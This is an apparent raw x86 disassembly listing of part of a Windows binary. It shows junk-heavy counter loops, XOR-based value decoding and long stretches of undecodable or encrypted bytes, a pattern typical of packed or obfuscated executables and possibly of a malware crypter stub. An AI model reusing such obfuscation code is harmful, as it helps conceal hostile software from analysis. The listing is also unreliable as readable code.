  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	out    0x5d,al
  407c4c:	sub    eax,0x7ecc2bc7
  407c51:	jle    0x407c58
  407c53:	jl     0x407cd3
  407c55:	jle    0x407c2c
  407c57:	outs   dx,BYTE PTR ds:[esi]
  407c58:	cmp    DWORD PTR [esi],esp
  407c5a:	jle    0x407cb1
  407c5c:	cmp    ah,BYTE PTR [edx+0x2]
  407c5f:	mov    ch,0x8
  407c61:	rcr    BYTE PTR ds:0x49e53839,0x9c
  407c68:	retf   0xbee9
  407c6b:	jmp    0xe895:0x47fcb0f1
  407c72:	push   eax
  407c73:	bound  eax,QWORD PTR [ebp+0x52438994]
  407c79:	adc    DWORD PTR [esi-0x7116cd81],ebp
  407c7f:	div    DWORD PTR [edx+0x6e]
  407c82:	mov    al,0x16
  407c85:	test   eax,0x1dc4eb80
  407c8a:	and    edi,eax
  407c8c:	jns    0x407ccb
  407c8e:	jns    0x407cbf
  407c90:	mov    ch,0xfe
  407c92:	push   cs
  407c93:	dec    esi
  407c94:	sbb    BYTE PTR [eax+0x7a2f2129],al
  407c9a:	and    BYTE PTR [edi+ebp*2+0x6d35ad20],dl
  407ca1:	fcom   QWORD PTR [eax]
  407ca3:	mov    BYTE PTR [edi-0x3f884e8b],cl
  407ca9:	(bad)  
  407caa:	loope  0x407c5f
  407cac:	cmp    ebp,esi
  407cae:	adc    al,BYTE PTR [edx+0x3f]
  407cb1:	es dec ebx
  407cb3:	ret    
  407cb4:	xchg   ebp,eax
  407cb5:	sub    al,0x76
  407cb7:	push   0x77
  407cb9:	xchg   DWORD PTR [eax+eax*8],ebp
  407cbc:	push   esi
  407cbd:	and    al,BYTE PTR [ecx+0xc1e0791]
  407cc3:	test   BYTE PTR [esi],bl
  407cc5:	out    0x67,al
  407cc7:	jecxz  0x407cb5
  407cc9:	mov    DWORD PTR [ebp+0x79],ebp
  407ccc:	hlt    
  407ccd:	push   ecx
  407cce:	pop    esi
  407ccf:	(bad)  
  407cd0:	call   0x4e5de4ad
  407cd5:	ja     0x407c7e
  407cd7:	mov    ah,0x9a
  407cd9:	je     0x407cbf
  407cdb:	mov    bp,0x3905
  407cdf:	js     0x407cea
  407ce1:	scas   al,BYTE PTR es:[edi]
  407ce2:	ja     0x407d1b
  407ce4:	mov    edx,0x61ae717f
  407ce9:	stos   BYTE PTR es:[edi],al
  407cea:	pop    edx
  407ceb:	loope  0x407ce0
  407ced:	mov    al,ds:0x11fc5c98
  407cf2:	push   edx
  407cf3:	xchg   ecx,eax
  407cf4:	jno    0x407d1f
  407cf6:	leave  
  407cf7:	mov    ch,0x43
  407cf9:	add    DWORD PTR [ebx+0x7b0f1b7b],esi
  407cff:	mov    DWORD PTR [esi+0x75],ebp
  407d02:	pushf  
  407d03:	daa    
  407d04:	mov    bh,0x76
  407d06:	jle    0x407d58
  407d08:	call   0xf5f9:0xf09e6f37
  407d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d10:	pop    esi
  407d11:	loope  0x407d48
  407d13:	rol    BYTE PTR [esi],cl
  407d15:	(bad)  
  407d17:	out    0x7f,al
  407d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d1a:	ins    DWORD PTR es:[edi],dx
  407d1b:	jo     0x407d46
  407d1d:	cmp    al,0x4
  407d1f:	shr    BYTE PTR [esi+0x52],cl
  407d22:	cmp    edi,0x80b9cdfb
  407d28:	(bad)  
  407d29:	out    0x24,eax
  407d2b:	dec    esp
  407d2c:	cmp    BYTE PTR [edx-0x2a],bl
  407d2f:	iret   
  407d30:	xchg   edi,eax
  407d31:	sub    edx,DWORD PTR [eax-0x33]
  407d34:	out    dx,al
  407d35:	fidivr DWORD PTR gs:[ebx-0x6d80b72d]
  407d3c:	outs   dx,BYTE PTR ds:[esi]
  407d3d:	stos   DWORD PTR es:[edi],eax
  407d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d3f:	xor    DWORD PTR [ebp-0x50],ecx
  407d42:	cmp    al,ch
  407d44:	outs   dx,BYTE PTR ds:[esi]
  407d45:	mov    ch,0x3d
  407d47:	mov    esi,0x36e75d52
  407d4c:	addr16 cs (bad) 
  407d4f:	out    0x77,al
  407d51:	push   es
  407d52:	aas    
  407d53:	in     eax,0xe9
  407d55:	jno    0x407d9a
  407d57:	mov    esi,0xa8ea438b
  407d5c:	push   ds
  407d5d:	scas   eax,DWORD PTR es:[edi]
  407d5e:	scas   al,BYTE PTR es:[edi]
  407d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d60:	xlat   BYTE PTR ds:[ebx]
  407d61:	and    ah,BYTE PTR [esi+ebx*4-0x25ff3e02]
  407d68:	in     eax,0x15
  407d6a:	adc    al,0xa3
  407d6c:	add    DWORD PTR [bp+di+0x1be5],edx
  407d71:	cmp    bl,BYTE PTR [edx+0x28]
  407d74:	push   ss
  407d75:	pop    esp
  407d76:	gs mov eax,0xe8d08b68
  407d7c:	inc    esp
  407d7d:	pushf  
  407d7e:	sub    al,0xd1
  407d80:	test   eax,0xfd7d262e
  407d85:	imul   ebp,esi,0x952b57f8
  407d8b:	mov    cl,0x8f
  407d8d:	sti    
  407d8e:	dec    ecx
  407d8f:	pop    edx
  407d90:	mov    BYTE PTR [edx],dh
  407d92:	aaa    
  407d93:	push   ecx
  407d94:	loop   0x407dc8
  407d96:	mov    bl,BYTE PTR ds:[edx-0x7d2b5c16]
  407d9d:	xlat   BYTE PTR ds:[ebx]
  407d9e:	lahf   
  407d9f:	add    al,0xdb
  407da1:	push   ss
  407da2:	dec    eax
  407da3:	lods   eax,DWORD PTR ds:[esi]
  407da4:	pop    ds
  407da5:	adc    BYTE PTR [ebp-0x7b],ch
  407da8:	jns    0x407d92
  407daa:	iret   
  407dab:	hlt    
  407dac:	push   edx
  407dad:	fisub  WORD PTR [eax-0x1c6a7040]
  407db3:	ret    0x1686
  407db6:	jmp    0xb4fd:0xb95bd453
  407dbd:	sti    
  407dbe:	in     al,0xa7
  407dc0:	in     al,dx
  407dc1:	mov    ch,0x54
  407dc3:	adc    eax,eax
  407dc5:	cld    
  407dc6:	sub    eax,0x85a50212
  407dcb:	xchg   ebx,eax
  407dcc:	daa    
  407dcd:	mov    ebp,0xaf2351bf
  407dd2:	xchg   edx,eax
  407dd3:	dec    ebx
  407dd4:	xchg   edx,eax
  407dd5:	jmp    0xb188df9a
  407dda:	xchg   ah,al
  407ddc:	push   0x3b89b77f
  407de1:	dec    edx
  407de2:	jns    0x407e5c
  407de4:	aam    0xf1
  407de6:	call   0xec49a7c4
  407deb:	and    DWORD PTR [edx+0x53],ebx
  407dee:	sub    al,0x7f
  407df0:	jno    0x407e28
  407df2:	pop    esi
  407df3:	adc    ebx,DWORD PTR [esi+0x74]
  407df6:	fisub  DWORD PTR [edi+0x56cfc1e1]
  407dfc:	mov    ebx,0xb6a77a65
  407e01:	or     DWORD PTR [ebx],edi
  407e03:	xor    bl,BYTE PTR [edx]
  407e05:	push   ebx
  407e06:	jb     0x407de8
  407e08:	cli    
  407e09:	mul    DWORD PTR [edi+ebx*2-0x17]
  407e0d:	pop    esi
  407e0e:	imul   esi,eax,0x19497d9a
  407e14:	jmp    0x407e22
  407e16:	jae    0x407e32
  407e18:	xlat   BYTE PTR ds:[ebx]
  407e19:	mov    ss,WORD PTR [edx+0x19a01e3b]
  407e1f:	pop    esi
  407e20:	sub    al,0xd5
  407e22:	imul   eax,ebx,0xd632f943
  407e28:	jecxz  0x407e38
  407e2a:	sbb    dh,BYTE PTR [ebx-0x55]
  407e2d:	lods   eax,DWORD PTR ds:[esi]
  407e2e:	cli    
  407e2f:	fist   WORD PTR [esi+0x3a00da9e]
  407e35:	cmp    ah,BYTE PTR [ecx]
  407e37:	inc    ebp
  407e38:	cli    
  407e39:	mov    ah,0x9e
  407e3b:	mov    cl,0xc1
  407e3d:	jne    0x407e16
  407e3f:	mov    esp,ecx
  407e41:	dec    edi
  407e42:	mov    eax,ds:0x74cb5edb
  407e47:	imul   eax,DWORD PTR [edi],0xf
  407e4a:	xor    edx,esi
  407e4c:	push   ebx
  407e4d:	jno    0x407df9
  407e4f:	xlat   BYTE PTR ds:[ebx]
  407e50:	test   eax,0x779de875
  407e55:	in     al,0xdb
  407e57:	mov    edi,0x5146fc4e
  407e5c:	repz jmp 0x89511ba8
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x50525b0d
  408191:	pop    esp
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	retf   
  40819b:	es jle 0x4081f8
  40819e:	sub    ch,BYTE PTR [edi+0x7946678]
  4081a4:	and    DWORD PTR [ebx+0x20712fab],ecx
  4081aa:	loopne 0x40812d
  4081ac:	lock adc al,0xc4
  4081af:	mov    esi,0x9d94f3b
  4081b4:	sbb    eax,ecx
  4081b6:	jmp    0xe9ec:0x636ba231
  4081bd:	ds mov bh,0xf8
  4081c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c1:	add    edx,DWORD PTR [ebx+0xe]
  4081c4:	ficom  DWORD PTR [esi-0x6b6e507d]
  4081ca:	dec    edx
  4081cb:	inc    edx
  4081cc:	and    ch,ch
  4081ce:	adc    dh,ch
  4081d0:	jmp    0x5ae8:0xe30b0647
  4081d7:	dec    esi
  4081d8:	add    dh,dh
  4081da:	sub    al,bh
  4081dc:	sahf   
  4081dd:	mov    ds:0xd3e76adf,eax
  4081e2:	js     0x4081c4
  4081e4:	push   ebp
  4081e5:	(bad)  
  4081e6:	sbb    bl,BYTE PTR [ebp+0x4fa971e4]
  4081ec:	scas   eax,DWORD PTR es:[edi]
  4081ed:	push   edx
  4081ee:	adc    dh,bl
  4081f0:	fucomip st,st(0)
  4081f2:	push   edi
  4081f3:	aam    0x4e
  4081f5:	xchg   ebp,eax
  4081f6:	dec    edi
  4081f7:	jns    0x408196
  4081f9:	mov    ch,0x24
  4081fb:	aad    0xf7
  4081fd:	pop    ss
  4081fe:	and    DWORD PTR [ecx+0x47],edx
  408201:	push   esi
  408202:	cmp    bh,BYTE PTR [ebp-0x56]
  408205:	mov    cl,0x76
  408207:	push   esi
  408208:	(bad)  
  408209:	sbb    DWORD PTR [ecx+0x4e0f81d5],eax
  40820f:	scas   al,BYTE PTR es:[edi]
  408210:	xchg   esp,eax
  408211:	cmc    
  408212:	mov    ds:0xadbb816e,al
  408217:	cmp    BYTE PTR [ebx],0x0
  40821a:	jne    0x4081c4
  40821c:	and    al,0x5c
  40821e:	cmp    DWORD PTR [esi+0x521a9e7a],ecx
  408224:	mov    eax,0xc9ec7de6
  408229:	cld    
  40822a:	mov    ah,0x3f
  40822c:	mov    ebp,0x2b000b9
  408231:	mov    bl,0x0
  408233:	pusha  
  408234:	out    0xdd,al
  408236:	fimul  DWORD PTR [esi+0x47]
  408239:	mov    dh,0x2e
  40823b:	xchg   ebp,eax
  40823c:	outs   dx,DWORD PTR ds:[esi]
  40823d:	and    dl,BYTE PTR [edi]
  40823f:	mov    edi,0x60702d78
  408244:	cmp    cl,BYTE PTR [ebp+0x4e]
  408247:	mov    BYTE PTR ds:0x84e4eeb8,ah
  40824d:	test   BYTE PTR [esp+ecx*8+0xe6f1181],0x3c
  408255:	adc    DWORD PTR [ecx+ebx*8],esi
  408258:	dec    esi
  408259:	rcl    DWORD PTR [eax+0x5c5a30ff],1
  40825f:	inc    edx
  408260:	dec    ecx
  408261:	xchg   edi,ebx
  408263:	xchg   ebx,edi
  408265:	mov    ch,0x72
  408267:	out    dx,al
  408268:	and    al,0x1e
  40826a:	xor    ebx,DWORD PTR [eax]
  40826c:	inc    ebp
  40826d:	std    
  40826e:	mov    dl,0xc0
  408270:	in     al,dx
  408271:	xor    DWORD PTR [edi-0x18],esi
  408274:	cmp    esp,DWORD PTR [edi-0x4f3b0b8f]
  40827a:	xchg   DWORD PTR [edx-0x52],ebx
  40827d:	pop    ss
  40827e:	sbb    BYTE PTR [eax-0x5f],0x3f
  408282:	test   BYTE PTR es:[eax+0xb],cl
  408286:	fs push ebp
  408288:	out    dx,eax
  408289:	xor    BYTE PTR [edx-0x5d],al
  40828c:	and    eax,0x2c7c64b
  408291:	(bad)  
  408293:	sub    eax,DWORD PTR [esi-0x1720cb5]
  408299:	mov    al,0xde
  40829b:	mov    edx,0x3763697a
  4082a0:	push   esp
  4082a1:	dec    eax
  4082a2:	ret    
  4082a3:	outs   dx,DWORD PTR ds:[esi]
  4082a4:	xor    bh,al
  4082a6:	(bad)
  4082a9:	mov    cl,0x78
  4082ab:	test   eax,0x4c067bf7
  4082b0:	imul   esp,DWORD PTR [esp+esi*8-0x3b],0xab9bec3a
  4082b8:	jg     0x408280
  4082ba:	or     eax,0x80688118
  4082bf:	ja     0x40831a
  4082c1:	popf   
  4082c2:	daa    
  4082c3:	pop    ds
  4082c4:	pop    ebp
  4082c5:	add    BYTE PTR [esp+edi*2-0x4a9f0029],0x8
  4082cd:	out    dx,eax
  4082ce:	or     BYTE PTR [ecx],0xdd
  4082d1:	stos   BYTE PTR es:[edi],al
  4082d2:	int3   
  4082d3:	int    0x34
  4082d5:	and    eax,0x789a3b0
  4082da:	jle    0x408295
  4082dc:	call   0x97e0:0x8b45a546
  4082e3:	ins    BYTE PTR es:[edi],dx
  4082e4:	ret    
  4082e5:	les    edi,FWORD PTR [ebp-0x66887859]
  4082eb:	sbb    BYTE PTR [eax+ebp*1-0x6fbb168],0x17
  4082f3:	repz bound edx,QWORD PTR [ebp+0x2e312ed2]
  4082fa:	and    eax,0x59402318
  4082ff:	lea    edx,[ebp-0x22e1081e]
  408305:	sub    ebp,0x2d
  408308:	lock push ds
  40830a:	es pop ebx
  40830c:	mov    ebx,0xbab358c8
  408311:	adc    eax,0xc888b034
  408316:	xor    eax,0x6c80b91b
  40831b:	mov    ebx,0x769f42b6
  408320:	jns    0x408328
  408322:	mov    esp,0xea052dae
  408327:	jb     0x40835b
  408329:	test   BYTE PTR [ebx],dl
  40832b:	or     esi,esp
  40832d:	adc    al,0xa8
  40832f:	xor    eax,0xc8f99777
  408334:	mov    dl,0x31
  408336:	addr16 repnz push ss
  408339:	stos   DWORD PTR es:[edi],eax
  40833a:	sti    
  40833b:	ret    
  40833c:	retf   0xdf37
  40833f:	dec    BYTE PTR [edi]
  408341:	push   0xffffffca
  408343:	out    dx,al
  408344:	jnp    0x408371
  408346:	mov    ds:0x19e2ffdb,al
  40834b:	sub    BYTE PTR [esp+ecx*2+0x5b],ah
  40834f:	jno    0x4083b1
  408351:	pop    es
  408352:	add    BYTE PTR [eax-0x6b0338c4],al
  408358:	sahf   
  408359:	xor    al,0x9a
  40835b:	cmp    al,0xa
  40835d:	je     0x4083ad
  40835f:	xchg   ebp,eax
  408360:	jnp    0x4083b5
  408362:	or     bl,BYTE PTR [edi]
  408364:	xchg   esp,eax
  408365:	int3   
  408366:	mov    BYTE PTR ds:0x592fbda6,cl
  40836c:	inc    edx
  40836d:	fcmovbe st,st(2)
  40836f:	mov    bl,0x50
  408371:	fdivr  st(5),st
  408373:	push   ss
  408374:	in     al,dx
  408375:	fst    DWORD PTR ds:0x37461a6
  40837b:	pop    eax
  40837c:	dec    ebx
  40837d:	std    
  40837e:	mov    esi,0xc5f4d594
  408383:	or     eax,0xa363a052
  408388:	inc    esi
  408389:	mov    ebx,0xdea10e61
  40838e:	iret   
  40838f:	cdq    
  408390:	jmp    0x4235:0x646c06ae
  408397:	rol    DWORD PTR [ecx+eax*8],1
  40839a:	not    DWORD PTR [edi-0x4c8f8c77]
  4083a0:	xor    esp,DWORD PTR [eax+0x13267072]
  4083a6:	inc    eax
  4083a7:	jmp    0x1af34735
  4083ac:	cwde   
  4083ad:	dec    esp
  4083ae:	jnp    0x4083b5
  4083b0:	mov    BYTE PTR [ebp-0x3022a86c],dh
  4083b6:	daa    
  4083b7:	or     BYTE PTR [ebp+ecx*2+0x6978cdec],0x1c
  4083bf:	ret    0x15f0
  4083c2:	ins    DWORD PTR es:[edi],dx
  4083c3:	push   ebx
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	push   ds
  408465:	enter  0xcd71,0xe4
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x4084ca
  408471:	and    DWORD PTR [esi],ecx
  408473:	cmp    BYTE PTR [ebx+edi*4],al
  408476:	push   0x34ae9014
  40847b:	dec    edi
  40847c:	xor    BYTE PTR [edx],ch
  40847e:	inc    ebx
  40847f:	aas    
  408480:	enter  0xbd6a,0x44
  408484:	daa    
  408485:	push   ecx
  408486:	jmp    0x4084c0
  408488:	inc    ebp
  408489:	ss inc eax
  40848b:	push   ecx
  40848c:	add    esp,eax
  40848e:	xchg   ecx,eax
  40848f:	fwait
  408490:	loopne 0x4084cc
  408492:	out    dx,eax
  408493:	cs adc eax,0xa3951941
  408499:	test   BYTE PTR [eax+eax*2],ch
  40849c:	add    ebx,DWORD PTR [ecx]
  40849e:	test   al,0x8e
  4084a1:	int    0xb3
  4084a3:	and    bh,cl
  4084a5:	stos   BYTE PTR es:[edi],al
  4084a6:	mov    eax,0x1b822073
  4084ab:	test   BYTE PTR [edi],bh
  4084ad:	cli    
  4084ae:	sti    
  4084af:	jecxz  0x408521
  4084b1:	xor    BYTE PTR [ebx],ch
  4084b3:	ds in  eax,dx
  4084b5:	aas    
  4084b6:	inc    eax
  4084b7:	pop    ebp
  4084b8:	fucomi st,st(4)
  4084ba:	push   cs
  4084bb:	arpl   WORD PTR [ecx+esi*1+0x5e],ax
  4084bf:	xchg   esi,eax
  4084c0:	jmp    0x4084e2
  4084c2:	mov    ds:0xa3e9543e,eax
  4084c7:	adc    dl,BYTE PTR [ebp+ebx*1+0x40]
  4084cb:	jecxz  0x4084f4
  4084cd:	and    al,0xf1
  4084cf:	or     BYTE PTR [ecx+0x2cfdf343],ch
  4084d5:	sub    ah,BYTE PTR [ebx-0x7e]
  4084d8:	pop    esp
  4084d9:	pop    edx
  4084da:	adc    BYTE PTR [eax+0x2e59cee],ah
  4084e0:	pop    ds
  4084e1:	pop    edi
  4084e2:	mov    ebx,0x2438322d
  4084e7:	pop    esi
  4084e8:	pushf  
  4084e9:	mov    edi,0xc03dc247
  4084ee:	cli    
  4084ef:	jno    0x408521
  4084f1:	jnp    0x408503
  4084f3:	push   edi
  4084f4:	clc    
  4084f5:	iret   
  4084f6:	pop    ebp
  4084f7:	or     eax,0x22d3265
  4084fc:	jp     0x408542
  4084fe:	jno    0x4084ff
  408500:	pop    ss
  408501:	nop
  408502:	or     al,0x5d
  408504:	jmp    FWORD PTR [ebx+0x1481817c]
  40850a:	xchg   esp,eax
  40850b:	inc    esp
  40850c:	mov    ecx,0x30284f09
  408511:	or     BYTE PTR [esi+0x2f],ah
  408514:	jns    0x40856b
  408516:	pop    edi
  408517:	out    0xa7,eax
  408519:	xchg   ecx,eax
  40851a:	adc    eax,0xcd2c2161
  40851f:	ror    cl,cl
  408521:	clc    
  408522:	stc    
  408523:	mov    BYTE PTR [esi],ah
  408525:	push   es
  408526:	add    bh,cl
  408528:	xchg   ebx,eax
